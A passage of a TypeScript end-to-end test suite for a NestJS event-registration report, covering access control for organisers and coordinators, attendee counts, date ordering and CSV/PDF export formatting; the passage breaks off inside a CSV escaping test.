/*
 * Story: SPM-63 View Registration Information (Organiser and Coordinator), backend half.
 * ACs: AC1 (view the report), AC2 (total), AC3 (names, emails, dates), AC4 (CSV / PDF export),
 *      AC5 (no access to events I do not manage), AC6 (new registrations and withdrawals appear without caching).
 * Test cases: VIEW-REG-INFO-01-A, 01-B, 01-C, 02-A, 02-B, 03-A, 04-A, 04-B, 04-C, 04-D, 04-E,
 *             05-A, 05-B, 05-C, 05-D, 06-A (backend), 06-B (backend).
 *
 * Real Nest pipeline and real PostgreSQL; time comes from the injected CLOCK and never from the wall clock.
 * Oracles are literals from the Confluence cases and the prompt's resolved specs (2.5), never imported from
 * production code. Conventions (documented once here):
 *  - Suite clock T0 = 2026-09-29T12:00:00+08:00 = 2026-09-29T04:00:00Z.
 *  - The Confluence ids (EVT-101, COO-01, REG-9001 ...) are labels; the repo uses UUIDs, so each test names its
 *    fixtures with those labels in comments. SPEC "Confirmed" is the stored status "Registered"; SPEC "Withdrawn"
 *    is 'Withdrawn'. Q8: a Cancelled registration cannot exist (CHECK constraint), so that fixture is Not Automated.
 *  - Q9: EVT-106 "Planning" is not an allowed event status, so the empty event is seeded as Confirmed.
 *  - The three "doors" (report, CSV export, PDF export) share one authorization rule; the AC5 tests run over all three.
 *  - Every fixture id is deterministic (Guide 3E: fixed ids): a per-test counter feeds uuid() below, nothing calls randomUUID.
 *    The three main registrations have fixed ids chosen so that sorting by id gives a different order from sorting by
 *    registration date, so the date-order tests fail for an id-only sort on every run, not by luck. Rows added without an id
 *    get descending ids for the same reason.
 * Needs DATABASE_URL with database/postgresql/init 001 to 007 applied.
 */
import { INestApplication, Logger } from '@nestjs/common';
import { Test } from '@nestjs/testing';
import { PDFParse } from 'pdf-parse';
import pg from 'pg';
import request from 'supertest';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { AppModule } from '../app.module.js';
import { CLOCK } from './clock.js';

const database = process.env.DATABASE_URL;
const T0 = new Date('2026-09-29T12:00:00+08:00');
const MSG_08 = "You do not have access to this event's registrations.";
// EVT-101 "Tech Talk: Cloud 101" runs 9 Oct 2026 18:00-21:00 SGT (04-B).
const EVT_101_START = '2026-10-09T18:00:00+08:00';
const EVT_101_END = '2026-10-09T21:00:00+08:00';
// Registration instants for the three Confirmed attendees (03-A): SGT 15:00 / 10:30 / 09:00.
const DEV_AT = '2026-09-27T07:00:00.000Z';
const ALICE_AT = '2026-09-28T02:30:00.000Z';
const CHLOE_AT = '2026-09-29T01:00:00.000Z';
const BEN_AT = '2026-09-28T04:00:00.000Z';
const SENTINEL = 'SENTINEL-INTERNAL';
// Fixed registration ids. Id order (Alice < Chloe < Ben < Dev) differs from date order (Dev, Alice, Chloe), and from the
// two-row order of the 01-A fixture (Dev, Alice).
const REG_DEV = 'cccccccc-0000-4000-8000-000000009007';
const REG_ALICE = 'aaaaaaaa-0000-4000-8000-000000009001';
const REG_CHLOE = 'bbbbbbbb-0000-4000-8000-0000000000e1';
const REG_BEN = 'dddddddd-0000-4000-8000-000000009003';
// An event id that no fixture ever creates (05-D-ORDER).
const UNKNOWN_EVENT = '63e00000-0000-4000-8000-00000000ffff';
const EVENT_PREFIX = '63e00000';
const uuid = (prefix: string, n: number) => `${prefix}-0000-4000-8000-${n.toString(16).padStart(12, '0')}`;
const ATTENDEE_DETAILS = { fullName: 'Farhan Rahman', email: 'farhan.rahman@example.com', contactNumber: '81234567' };

type Door = [name: string, path: (eventId: string) => string];
const DOORS: Door[] = [
  ['report', (id) => `/api/events/${id}/registrations/report`],
  ['CSV export', (id) => `/api/events/${id}/registrations/report/export?format=csv`],
  ['PDF export', (id) => `/api/events/${id}/registrations/report/export?format=pdf`],
];

const bufferBody = (res: request.Response, callback: (error: Error | null, body: Buffer) => void) => {
  const chunks: Buffer[] = [];
  res.on('data', (chunk: Buffer) => chunks.push(chunk));
  res.on('end', () => callback(null, Buffer.concat(chunks)));
};

async function pdfText(bytes: Buffer): Promise<string> {
  const parser = new PDFParse({ data: new Uint8Array(bytes) });
  try {
    return (await parser.getText()).text;
  } finally {
    await parser.destroy();
  }
}
const squash = (text: string) => text.replace(/\s+/g, '');

describe.skipIf(!database)('SPM-63 registration report (e2e, PostgreSQL)', () => {
  let app: INestApplication;
  let pool: pg.Pool;
  let now = T0;
  const eventIds: string[] = [];
  const userIds: string[] = [];

  let seq = 0;
  beforeAll(async () => {
    pool = new pg.Pool({ connectionString: database });
    // Deterministic ids and emails would collide with rows a crashed earlier run left behind, so clear them first.
    await pool.query('DELETE FROM events WHERE id::text LIKE $1', [`${EVENT_PREFIX}-%`]);
    await pool.query("DELETE FROM users WHERE email LIKE 'spm63-%@example.com'");
  });
  afterAll(async () => {
    await pool.end();
  });
  beforeEach(async () => {
    now = T0;
    seq = 0;
    const module = await Test.createTestingModule({ imports: [AppModule] })
      .overrideProvider(CLOCK)
      .useValue({ now: () => now })
      .compile();
    app = module.createNestApplication();
    await app.listen(0);
  });
  afterEach(async () => {
    vi.restoreAllMocks();
    await app?.close();
    await pool.query('DELETE FROM events WHERE id = ANY($1::uuid[])', [eventIds.splice(0)]);
    await pool.query('DELETE FROM users WHERE id = ANY($1::uuid[])', [userIds.splice(0)]);
  });

  /** Creates a user with one role; logs in (session cookie) unless told not to. */
  async function createUser(role: string, name: string, options: { login?: boolean } = {}) {
    seq += 1;
    const email = `spm63-${seq}@example.com`;
    const created = await pool.query<{ id: string }>(
      `INSERT INTO users (id, email, display_name, password_hash)
       VALUES ($1, $2, $3, crypt('password123', gen_salt('bf', 4))) RETURNING id`,
      [uuid('63b00000', seq), email, name],
    );
    const uid = created.rows[0].id;
    userIds.push(uid);
    await pool.query('INSERT INTO user_roles (user_id, role_id) SELECT $1, id FROM roles WHERE name = $2', [uid, role]);
    if (options.login === false) return { uid, cookie: '' };
    const login = await request(app.getHttpServer()).post('/api/auth/login').send({ email, password: 'password123' }).expect(201);
    const cookie = (login.headers['set-cookie'] as unknown as string[]).find((c) => c.startsWith('connectsphere_session='))!;
    return { uid, cookie: cookie.split(';', 1)[0] };
  }

  /** Seeds a published event owned by `organiserId` and assigned to `coordinatorId`, with sentinel internal fields. */
  async function seedEvent(options: {
    name: string;
    organiserId: string;
    coordinatorId?: string | null;
    start?: string;
    end?: string;
    limit?: number;
    status?: string;
  }) {
    const id = uuid(EVENT_PREFIX, ++seq);
    eventIds.push(id);
    await pool.query(
      `INSERT INTO events (id, organiser_id, organiser_name, organiser_email, event_name, purpose, description,
         start_date_time, end_date_time, expected_attendance, registration_enabled, registration_limit,
         status, coordinator_id, coordinator_name, equipment_needs, submission_key)
       VALUES ($1,$2,'Organiser','org-sentinel@example.com',$3,$4::varchar,$4::text,$5,$6,50,true,$7,$8,$9,'Coordinator Sentinel',$4::text,$10)`,
      [
        id,
        options.organiserId,
        options.name,
        SENTINEL,
        new Date(options.start ?? EVT_101_START),
        new Date(options.end ?? EVT_101_END),
        options.limit ?? 50,
        options.status ?? 'Confirmed',
        options.coordinatorId ?? null,
        uuid('63d00000', ++seq),
      ],
    );
    // A coordinator clarification note stands for "coordinator notes": it must never reach the report.
    await pool.query(
      `INSERT INTO event_comments (id, event_id, type, author_id, author_name, author_role, message)
       VALUES ($1, $2, 'clarification', $3, 'Coordinator Sentinel', 'coordinator', $4)`,
      [uuid('63c00000', ++seq), id, options.coordinatorId ?? options.organiserId, SENTINEL],
    );
    return id;
  }

  /** Seeds a registration row directly (the register flow itself is covered by SPM-61). */
  async function seedRegistration(
    eventId: string,
    attendeeId: string,
    options: { fullName: string; email: string; contact?: string | null; at: string; status?: 'Registered' | 'Withdrawn'; id?: string },
  ) {
    const result = await pool.query<{ id: string }>(
      `INSERT INTO event_registrations (id, event_id, attendee_id, status, full_name, email, contact_number, created_at)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8) RETURNING id`,
      [
        options.id ?? uuid('63a00000', 4095 - ++seq),
        eventId,
        attendeeId,
        options.status ?? 'Registered',
        options.fullName,
        options.email,
        options.contact === undefined ? '98765432' : options.contact,
        new Date(options.at),
      ],
    );
    return result.rows[0].id;
  }

  /** One attendee account (no login) plus a registration row for it. */
  async function addRegistration(eventId: string, o: Parameters<typeof seedRegistration>[2]) {
    const attendee = await createUser('ATTENDEE', o.fullName, { login: false });
    return { attendeeId: attendee.uid, registrationId: await seedRegistration(eventId, attendee.uid, o) };
  }

  /**
   * EVT-101 with COO-01 assigned and ORG-01 owning it; REG-9007 Dev Patel, REG-9001 Alice Tan (ATT-01, can log in),
   * REG-EXTRA-01 Chloe Ng Confirmed (left out with `withChloe: false`, the 01-A fixture), and REG-9003 Ben Lim
   * Withdrawn (absent from every channel).
   */
  async function seedEvt101(options: { withChloe?: boolean } = {}) {
    const { withChloe = true } = options;
    const coo01 = await createUser('COORDINATOR', 'Daniel Koh');
    const org01 = await createUser('ORGANISER', 'Farid Rahman');
    const eventId = await seedEvent({ name: 'Tech Talk: Cloud 101', organiserId: org01.uid, coordinatorId: coo01.uid });
    const dev = await addRegistration(eventId, { id: REG_DEV, fullName: 'Dev Patel', email: 'dev.patel@example.com', contact: '87654321', at: DEV_AT });
    const att01 = await createUser('ATTENDEE', 'Alice Tan');
    const aliceReg = await seedRegistration(eventId, att01.uid, { id: REG_ALICE, fullName: 'Alice Tan', email: 'alice.tan@example.com', contact: '98765432', at: ALICE_AT });
    const chloe = withChloe
      ? await addRegistration(eventId, { id: REG_CHLOE, fullName: 'Chloe Ng', email: 'chloe.ng@example.com', contact: '91234567', at: CHLOE_AT })
      : undefined;
    await addRegistration(eventId, { id: REG_BEN, fullName: 'Ben Lim', email: 'ben.lim@example.com', contact: '90001111', at: BEN_AT, status: 'Withdrawn' });
    return { eventId, coo01, org01, att01, regs: { dev: dev.registrationId, alice: aliceReg, chloe: chloe?.registrationId as string } };
  }

  /** GET a path with an optional session; the body is always buffered so binary exports can be inspected. */
  async function call(path: string, cookie?: string) {
    let req = request(app.getHttpServer()).get(path);
    if (cookie) req = req.set('Cookie', cookie);
    const res = await req.buffer(true).parse(bufferBody);
    const bytes = res.body as Buffer;
    return { status: res.status, headers: res.headers, bytes, text: bytes.toString('utf8') };
  }
  const reportPath = (eventId: string) => `/api/events/${eventId}/registrations/report`;
  const exportPath = (eventId: string, format: string) => `${reportPath(eventId)}/export?format=${format}`;
  const reportJson = async (eventId: string, cookie: string) => {
    const res = await call(reportPath(eventId), cookie);
    expect(res.status).toBe(200);
    return JSON.parse(res.text);
  };
  const registrationCount = () =>
    pool.query<{ count: number }>('SELECT COUNT(*)::integer AS count FROM event_registrations').then((r) => r.rows[0].count);

  describe('AC1: a manager can view the registration report', () => {
    // VIEW-REG-INFO-01-A
    // Oracle (SPEC 01-A): COO-01 assigned to EVT-101 gets 200 with exactly REG-9007 then REG-9001, in registration-date
    // order; REG-9003 (Withdrawn) is absent. This is the case's own fixture: two Confirmed rows and one Withdrawn.
    // Kills: assignment lookup on the wrong column (the real coordinator is refused); Withdrawn row included.
    it('VIEW-REG-INFO-01-A: the assigned coordinator gets 200 and exactly REG-9007 and REG-9001 in date order', async () => {
      // Arrange: no REG-EXTRA-01 here, so the report holds exactly the rows the case names.
      const { eventId, coo01, regs } = await seedEvt101({ withChloe: false });

      // Act
      const res = await call(reportPath(eventId), coo01.cookie);

      // Assert
      expect(res.status).toBe(200);
      const body = JSON.parse(res.text);
      expect(body.registrations.map((r: { registrationId: string }) => r.registrationId)).toEqual([regs.dev, regs.alice]);
      expect(body.registrations.map((r: { fullName: string }) => r.fullName)).toEqual(['Dev Patel', 'Alice Tan']); // Ben Lim (REG-9003) absent
      expect(body.totalConfirmed).toBe(2);
    });

    // VIEW-REG-INFO-01-B
    // Oracle (SPEC 01-B): EVT-101 shows 3 rows; EVT-105 (Data Science Meetup, capacity 2) shows Ben Lim and Dev Patel;
    // EVT-101 again shows 3. The event name and capacity come from each event.
    // Kills: report not keyed by event id (a stale or shared result); capacity not read per event.
    it('VIEW-REG-INFO-01-B: switching events returns each event\'s own report', async () => {
      // Arrange: COO-01 manages EVT-101 and EVT-105.
      const { eventId: evt101, coo01, org01 } = await seedEvt101();
      const evt105 = await seedEvent({ name: 'Data Science Meetup', organiserId: org01.uid, coordinatorId: coo01.uid, limit: 2 });
      await addRegistration(evt105, { fullName: 'Ben Lim', email: 'ben.lim@example.com', at: BEN_AT });
      await addRegistration(evt105, { fullName: 'Dev Patel', email: 'dev.patel@example.com', at: DEV_AT });

      // Act
      const first = await reportJson(evt101, coo01.cookie);
      const second = await reportJson(evt105, coo01.cookie);
      const third = await reportJson(evt101, coo01.cookie);

      // Assert
      expect([first.event.name, first.registrations.length]).toEqual(['Tech Talk: Cloud 101', 3]);
      expect([second.event.name, second.registrations.map((r: { fullName: string }) => r.fullName)]).toEqual([
        'Data Science Meetup',
        ['Dev Patel', 'Ben Lim'], // date order: Dev 27 Sep, Ben 28 Sep
      ]);
      expect([second.event.capacity, second.totalConfirmed, second.availableSpots]).toEqual([2, 2, 0]);
      expect([third.event.name, third.registrations.length]).toEqual(['Tech Talk: Cloud 101', 3]);
    });

    // VIEW-REG-INFO-01-C
    // Oracle (SPEC 01-C): the owning organiser gets the same 200 body as the coordinator; no sentinel internal data;
    // the event keys are exactly the D16 allowlist and the registration keys exactly the six of D2.
    // Kills: M14 the event row spread into the response; ownership not honoured; a registration key added (idempotency
    //        key, attendee id, special requirements).
    it('VIEW-REG-INFO-01-C: the owning organiser gets the same allowlisted body', async () => {
      // Arrange
      const { eventId, coo01, org01 } = await seedEvt101();

      // Act
      const asCoordinator = await call(reportPath(eventId), coo01.cookie);
      const asOrganiser = await call(reportPath(eventId), org01.cookie);

      // Assert
      expect(asOrganiser.status).toBe(200);
      expect(asOrganiser.text).toBe(asCoordinator.text); // same fixture, same clock
      expect(asOrganiser.text).not.toContain(SENTINEL);
      expect(asOrganiser.text).not.toContain('org-sentinel@example.com');
      const body = JSON.parse(asOrganiser.text);
      expect(Object.keys(body).sort()).toEqual(['availableSpots', 'event', 'generatedAt', 'registrations', 'totalConfirmed']);
      expect(Object.keys(body.event).sort()).toEqual(['capacity', 'endDateTime', 'id', 'name', 'startDateTime']);
      expect(Object.keys(body.registrations[0]).sort()).toEqual([
        'contactNumber', 'email', 'fullName', 'registeredAt', 'registrationId', 'status',
      ]);
    });
  });

  describe('AC2: the report states how many attendees are registered', () => {
    // VIEW-REG-INFO-02-A
    // Oracle (SPEC 02-A, R5): 3 Confirmed + 1 Withdrawn, capacity 50 -> totalConfirmed 3, availableSpots 47, 3 rows.
    // Kills: count taken from all rows (4); capacity arithmetic wrong; Withdrawn counted.
    it('VIEW-REG-INFO-02-A: counts Confirmed only and derives the available spots', async () => {
      // Arrange
      const { eventId, coo01 } = await seedEvt101();

      // Act
      const body = await reportJson(eventId, coo01.cookie);

      // Assert
      expect(body.totalConfirmed).toBe(3);
      expect(body.availableSpots).toBe(47); // 50 - 3
      expect(body.registrations).toHaveLength(3);
      expect(body.event.capacity).toBe(50);
    });

    // VIEW-REG-INFO-02-A-BND
    // Oracle (ASSUMED A10, D5): availableSpots never goes below zero. Two registrations on a capacity-1 event
    // (inserted directly, as a data fix could) still report 0 available, not -1.
    // Kills: the clamp removed.
    it('VIEW-REG-INFO-02-A-BND: available spots are clamped at zero', async () => {
      // Arrange
      const coo = await createUser('COORDINATOR', 'Daniel Koh');
      const eventId = await seedEvent({ name: 'Tiny', organiserId: 'org-x', coordinatorId: coo.uid, limit: 1 });
      await addRegistration(eventId, { fullName: 'A One', email: 'a@example.com', at: DEV_AT });
      await addRegistration(eventId, { fullName: 'B Two', email: 'b@example.com', at: ALICE_AT });

      // Act
      const body = await reportJson(eventId, coo.cookie);

      // Assert
      expect([body.totalConfirmed, body.availableSpots]).toEqual([2, 0]);
    });

    // VIEW-REG-INFO-02-B
    // Oracle (SPEC 02-B A, 06-A BE): ATT-05 registers through the SPM-61 endpoint; the very next GET shows 4 and the new row.
    // Kills: a server-side report cache that is not invalidated.
    it('VIEW-REG-INFO-02-B: a new registration is counted on the next request', async () => {
      // Arrange: 3 Confirmed on EVT-101; ATT-05 exists and the event is open for registration.
      const { eventId, coo01 } = await seedEvt101();
      const att05 = await createUser('ATTENDEE', 'Farhan Rahman');
      const before = await reportJson(eventId, coo01.cookie);
      expect(before.totalConfirmed).toBe(3);

      // Act
      await request(app.getHttpServer()).post(`/api/events/${eventId}/registrations`).set('Cookie', att05.cookie).send(ATTENDEE_DETAILS).expect(201);
      const after = await reportJson(eventId, coo01.cookie);

      // Assert
      expect([after.totalConfirmed, after.availableSpots]).toEqual([4, 46]);
      expect(after.registrations.map((r: { fullName: string }) => r.fullName)).toContain('Farhan Rahman');
    });

    // VIEW-REG-INFO-02-B
    // Oracle (SPEC 02-B B, fresh fixture per F6): REG-9001 is withdrawn through the SPM-120 endpoint -> 3 becomes 2 and Alice is gone.
    // Kills: Withdrawn still counted; the row kept until a manual refresh.
    it('VIEW-REG-INFO-02-B: a withdrawal is reflected on the next request', async () => {
      // Arrange
      const { eventId, coo01, att01, regs } = await seedEvt101();

      // Act
      await request(app.getHttpServer()).post(`/api/registrations/${regs.alice}/withdraw`).set('Cookie', att01.cookie).expect(200);
      const after = await reportJson(eventId, coo01.cookie);

      // Assert
      expect([after.totalConfirmed, after.availableSpots]).toEqual([2, 48]);
      expect(after.registrations.map((r: { registrationId: string }) => r.registrationId)).not.toContain(regs.alice);
    });
  });

  describe('AC3: each row carries name, email, contact number, registration date and status', () => {
    // VIEW-REG-INFO-03-A
    // Oracle (SPEC 03-A, F2/D7): rows in date order Dev, Alice, Chloe; values and instants as seeded; status "Confirmed".
    // Kills: M8 sorted descending or by id; two fields swapped; the Withdrawn row listed; UTC hour confusion
    //        (checked under three process time zones in Phase 4).
    it('VIEW-REG-INFO-03-A: three rows, in date order, with the exact values', async () => {
      // Arrange
      const { eventId, coo01, regs } = await seedEvt101();

      // Act
      const body = await reportJson(eventId, coo01.cookie);

      // Assert
      expect(body.registrations).toEqual([
        { registrationId: regs.dev, fullName: 'Dev Patel', email: 'dev.patel@example.com', contactNumber: '87654321', registeredAt: DEV_AT, status: 'Confirmed' },
        { registrationId: regs.alice, fullName: 'Alice Tan', email: 'alice.tan@example.com', contactNumber: '98765432', registeredAt: ALICE_AT, status: 'Confirmed' },
        { registrationId: regs.chloe, fullName: 'Chloe Ng', email: 'chloe.ng@example.com', contactNumber: '91234567', registeredAt: CHLOE_AT, status: 'Confirmed' },
      ]);
      expect(body.generatedAt).toBe('2026-09-29T04:00:00.000Z'); // the injected clock, ISO UTC
      expect(body.event.startDateTime).toBe('2026-10-09T10:00:00.000Z');
    });

    // VIEW-REG-INFO-03-A-BND
    // Oracle (D7): rows registered at the same instant are ordered by registration id ascending.
    // Kills: ties left to database order (insert the higher id first, so physical order is the wrong answer).
    it('VIEW-REG-INFO-03-A-BND: ties on the registration date are ordered by registration id', async () => {
      // Arrange
      const coo = await createUser('COORDINATOR', 'Daniel Koh');
      const eventId = await seedEvent({ name: 'Ties', organiserId: 'org-x', coordinatorId: coo.uid });
      const high = 'bbbbbbbb-0000-4000-8000-000000000002';
      const low = 'aaaaaaaa-0000-4000-8000-000000000001';
      await addRegistration(eventId, { id: high, fullName: 'Second Id', email: 's@example.com', at: DEV_AT });
      await addRegistration(eventId, { id: low, fullName: 'First Id', email: 'f@example.com', at: DEV_AT });

      // Act
      const body = await reportJson(eventId, coo.cookie);

      // Assert
      expect(body.registrations.map((r: { registrationId: string }) => r.registrationId)).toEqual([low, high]);
    });

    // VIEW-REG-INFO-03-A-NULL
    // Oracle (ASSUMED A8): a registration without a contact number (SPM-99 rows) is returned with an empty string.
    // Kills: null leaking into the contract (the screen and CSV would show "null").
    it('VIEW-REG-INFO-03-A-NULL: a missing contact number is an empty string', async () => {
      // Arrange
      const coo = await createUser('COORDINATOR', 'Daniel Koh');
      const eventId = await seedEvent({ name: 'No contact', organiserId: 'org-x', coordinatorId: coo.uid });
      await addRegistration(eventId, { fullName: 'No Phone', email: 'np@example.com', contact: null, at: DEV_AT });

      // Act
      const body = await reportJson(eventId, coo.cookie);

      // Assert
      expect(body.registrations[0].contactNumber).toBe('');
    });
  });

  describe('AC4: export as CSV or PDF', () => {
    // VIEW-REG-INFO-04-A
    // Oracle (SPEC 04-A, D2/D9, plus the user's filename and column requests): 200; text/csv; attachment named after the
    // event, lowercase with underscores (tech_talk_cloud_101_registrations.csv); body is the header (including Special
    // Requirements) and the three rows in date order, BOM first, CRLF endings, the Withdrawn row absent.
    // Kills: Withdrawn row exported; LF endings; header text drift; UTC hour; wrong filename or disposition.
    it('VIEW-REG-INFO-04-A: the CSV export has the right headers and body', async () => {
      // Arrange
      const { eventId, coo01 } = await seedEvt101();

      // Act
      const res = await call(exportPath(eventId, 'csv'), coo01.cookie);

      // Assert
      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('text/csv; charset=utf-8');
      expect(res.headers['content-disposition']).toBe(
        `attachment; filename="tech_talk_cloud_101_registrations.csv"; filename*=UTF-8''tech_talk_cloud_101_registrations.csv`,
      );
      expect(res.text).toBe(
        '﻿Name,Email,Contact Number,Special Requirements,Registration Date,Status\r\n' +
          'Dev Patel,dev.patel@example.com,87654321,,27 Sep 2026 15:00,Confirmed\r\n' +
          'Alice Tan,alice.tan@example.com,98765432,,28 Sep 2026 10:30,Confirmed\r\n' +
          'Chloe Ng,chloe.ng@example.com,91234567,,29 Sep 2026 09:00,Confirmed\r\n',
      );
    });

    // VIEW-REG-INFO-04-A-BND
    // Oracle (user request): the filename is the event name only, so it is the same whatever day the file is generated.
    // Kills: a generation date, or the event id, creeping back into the filename.
    it('VIEW-REG-INFO-04-A-BND: the filename does not change with the generation date', async () => {
      // Arrange
      const { eventId, coo01 } = await seedEvt101();
      now = new Date('2026-09-30T00:30:00+08:00');

      // Act
      const res = await call(exportPath(eventId, 'csv'), coo01.cookie);

      // Assert
      expect(res.headers['content-disposition']).toContain('filename="tech_talk_cloud_101_registrations.csv"');
    });

    // VIEW-REG-INFO-04-A-SPECIAL
    // Oracle (user request): an attendee who registers with special requirements through the real SPM-61 endpoint has the
    // exact text in the report JSON, in its own CSV column and in the PDF, so the coordinator can plan for it.
    // Kills: the column missing from the CSV or PDF; the text dropped by the report query; text altered on the way.
    it('VIEW-REG-INFO-04-A-SPECIAL: special requirements reach the report, the CSV and the PDF', async () => {
      // Arrange
      const { eventId, coo01 } = await seedEvt101();
      const attendee = await createUser('ATTENDEE', 'Attendee One');
      const needs = 'I am wheelchair bound';
      await request(app.getHttpServer())
        .post(`/api/events/${eventId}/registrations`)
        .set('Cookie', attendee.cookie)
        .send({ fullName: 'Attendee One', email: 'attendee1@example.com', contactNumber: '91234500', specialRequirements: needs })
        .expect(201);

      // Act
      const json = await reportJson(eventId, coo01.cookie);
      const csv = await call(exportPath(eventId, 'csv'), coo01.cookie);
      const pdf = await call(exportPath(eventId, 'pdf'), coo01.cookie);

      // Assert: JSON carries it only for the attendee who gave it
      const withNeeds = json.registrations.filter((r: { specialRequirements?: string }) => r.specialRequirements);
      expect(withNeeds.map((r: { fullName: string }) => r.fullName)).toEqual(['Attendee One']);
      expect(withNeeds[0].specialRequirements).toBe(needs);
      // Assert: CSV column between the contact number and the date
      expect(csv.text).toContain(`Attendee One,attendee1@example.com,91234500,${needs},`);
      // Assert: PDF has the heading and the text
      const pdfSquashed = squash(await pdfText(pdf.bytes));
      expect(pdfSquashed).toContain(squash('Special Requirements'));
      expect(pdfSquashed).toContain(squash(needs));
    });

    // VIEW-REG-INFO-04-A-FMT
    // Oracle (ASSUMED A11, D2): an unknown format is a 400 for a manager, and nothing else is returned.
    // Kills: falling through to a default format; a 500.
    it('VIEW-REG-INFO-04-A-FMT: an unknown export format is rejected with 400', async () => {
      // Arrange
      const { eventId, coo01 } = await seedEvt101();

      // Act
      const res = await call(exportPath(eventId, 'xlsx'), coo01.cookie);

      // Assert
      expect(res.status).toBe(400);
      expect(res.text).not.toContain('dev.patel@example.com');
    });

    // VIEW-REG-INFO-04-A-FMT
    // Oracle (ASSUMED A11, D2 + Guide 5C near-miss inputs): only the exact lower-case values csv and pdf are formats. A repeated
    // parameter (Express parses it as an array), a different case, an empty value and a missing parameter are all 400 with the
    // format message, and no attendee data is returned.
    // Kills: a lenient parser that takes the first of a repeated value or lower-cases the input; a default format when none is given.
    it.each([
      ['a repeated format', 'format=csv&format=pdf'],
      ['an upper-case format', 'format=CSV'],
      ['an empty format', 'format='],
      ['a missing format', ''],
    ])('VIEW-REG-INFO-04-A-FMT: %s is rejected with 400', async (_name, query) => {
      // Arrange
      const { eventId, coo01 } = await seedEvt101();

      // Act
      const res = await call(`${reportPath(eventId)}/export?${query}`, coo01.cookie);

      // Assert
      expect(res.status).toBe(400);
      expect(JSON.parse(res.text).message).toBe('Export format must be csv or pdf.');
      expect(res.text).not.toContain('dev.patel@example.com');
    });

    // VIEW-REG-INFO-04-B
    // Oracle (SPEC 04-B): 200 application/pdf, filename .pdf, body starts %PDF-; text in order: title, event range,
    // generated line, count line, the five headings, the three names; Ben Lim (Withdrawn) absent.
    // Kills: M19 PDF built from all statuses; summary count from all rows; headings missing; rows out of order.
    it('VIEW-REG-INFO-04-B: the PDF export has the header, the summary and the table', async () => {
      // Arrange
      const { eventId, coo01 } = await seedEvt101();

      // Act
      const res = await call(exportPath(eventId, 'pdf'), coo01.cookie);

      // Assert: transport
      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toBe('application/pdf');
      expect(res.headers['content-disposition']).toBe(
        `attachment; filename="tech_talk_cloud_101_registrations.pdf"; filename*=UTF-8''tech_talk_cloud_101_registrations.pdf`,
      );
      expect(res.bytes.subarray(0, 5).toString('latin1')).toBe('%PDF-');
      // Assert: text, in order
      const text = await pdfText(res.bytes);
      const wanted = [
        'Tech Talk: Cloud 101 - Registration Report',
        '9 Oct 2026 18:00-21:00 SGT',
        'Generated 29 Sep 2026 12:00 SGT',
        '3 Attendees Registered (3 / 50)',
        'Name', 'Email', 'Contact Number', 'Special Requirements', 'Registration Date', 'Status',
        'Dev Patel', 'Alice Tan', 'Chloe Ng',
      ];
      let cursor = 0;
      for (const piece of wanted) {
        const at = text.indexOf(piece, cursor);
        expect(at, `"${piece}" should appear after position ${cursor}`).toBeGreaterThanOrEqual(0);
        cursor = at + piece.length;
      }
      expect(text).not.toContain('Ben Lim');
    });

    // VIEW-REG-INFO-04-B-LONG
    // Oracle (SPEC 2.5 added): a 100-character name and "Zoë Ångström" appear complete in the extracted text
    // (whitespace ignored, because long names wrap onto several lines).
    // Kills: standard font dropping non-ASCII glyphs; long name clipped.
    it('VIEW-REG-INFO-04-B-LONG: a 100-character name and non-ASCII letters are not truncated', async () => {
      // Arrange: a 100-character name made of ten 9-letter words and spaces (10 x 9 + 9 spaces + 1 = 100).
      const longName = `${Array.from({ length: 10 }, () => 'Abcdefghi').join(' ')}x`;
      expect(longName).toHaveLength(100);
      const { eventId, coo01 } = await seedEvt101();
      await addRegistration(eventId, { fullName: longName, email: 'long@example.com', at: '2026-09-29T02:00:00.000Z' });
      await addRegistration(eventId, { fullName: 'Zoë Ångström', email: 'zoe@example.com', at: '2026-09-29T02:10:00.000Z' });

      // Act
      const res = await call(exportPath(eventId, 'pdf'), coo01.cookie);
      const text = squash(await pdfText(res.bytes));

      // Assert
      expect(text).toContain(squash(longName));
      expect(text).toContain('ZoëÅngström');
    });

    // VIEW-REG-INFO-04-C
    // Oracle (SPEC 04-C): an event with no registrations: report 200 with total 0 and [], screen empty state is FE;
    // CSV is the header row only; PDF is valid and says "No registrations to display".
    // Kills: M18 header dropped on empty CSV; a 500 on empty input; PDF table code throwing on an empty array.
    it('VIEW-REG-INFO-04-C: an event with no registrations exports cleanly', async () => {
      // Arrange: EVT-106 (seeded Confirmed, Q9) with COO-01 assigned and no registrations.
      const coo = await createUser('COORDINATOR', 'Daniel Koh');
      const eventId = await seedEvent({ name: 'Wellness Workshop', organiserId: 'org-x', coordinatorId: coo.uid });

      // Act
      const report = await reportJson(eventId, coo.cookie);
      const csv = await call(exportPath(eventId, 'csv'), coo.cookie);
      const pdf = await call(exportPath(eventId, 'pdf'), coo.cookie);

      // Assert
      expect([report.totalConfirmed, report.registrations]).toEqual([0, []]);
      expect(csv.status).toBe(200);
      expect(csv.text).toBe('﻿Name,Email,Contact Number,Special Requirements,Registration Date,Status\r\n');
      expect(pdf.status).toBe(200);
      expect(pdf.bytes.subarray(0, 5).toString('latin1')).toBe('%PDF-');
      expect(await pdfText(pdf.bytes)).toContain('No registrations to display');
    });

    // VIEW-REG-INFO-04-D
    // Oracle (SPEC 04-D): comma, plus sign and quote in real stored data reach the file RFC 4180 correct; an embedded
    // newline stays inside one record. Names are stored literally (SPM-61), so they are seeded directly.
    // Kills: M10 no comma quoting; M11 backslash escaping; a newline splitting a record.
    it('VIEW-REG-INFO-04-D: special characters in stored data are escaped in the CSV', async () => {
      // Arrange
      const coo = await createUser('COORDINATOR', 'Daniel Koh');
      const eventId = await seedEvent({ name: 'Specials', organiserId: 'org-x', coordinatorId: coo.uid });
      await addRegistration(eventId, { fullName: 'Smith, John', email: 'smith@example.com', contact: '91110001', at: DEV_AT });
      await addRegistration(eventId, { fullName: 'Plus Tag', email: 'test+tag@example.com', contact: '91110002', at: ALICE_AT });
      await addRegistration(eventId, { fullName: 'O"Brien', email: 'obrien@example.com', contact: '91110003', at: CHLOE_AT });
      await addRegistration(eventId, { fullName: 'Ann\nLee', email: 'ann@example.com', contact: '91110004', at: '2026-09-29T02:00:00.000Z' });

      // Act
      const res = await call(exportPath(eventId, 'csv'), coo.cookie);

      // Assert
      expect(res.text).toBe(
